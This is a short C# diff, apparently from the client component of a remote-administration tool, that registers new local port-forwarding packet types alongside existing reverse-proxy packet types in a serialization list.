@@ -86,7 +86,14 @@ namespace xClient.Core.Packets
                 typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (ReverseProxy.Packets.ReverseProxyData),
                 typeof (ReverseProxy.Packets.ReverseProxyDisconnect),
-                typeof (Packets.ClientPackets.GetConnectionsResponse)
+                typeof (Packets.ClientPackets.GetConnectionsResponse),
+                //typeof (PortForward.Packets.PortForwardDisconnect),
+                //typeof (PortForward.Packets.PortForwardInit),
+                //typeof (PortForward.Packets.PortForwardInitResponse),
+                typeof (PortForward.Local.Packets.LocalPortForwardConnect),
+                typeof (PortForward.Local.Packets.LocalPortForwardConnectResponse),
+                typeof (PortForward.Local.Packets.LocalPortForwardData),
+                typeof (PortForward.Local.Packets.LocalPortForwardDisconnect)
 
             };
         }
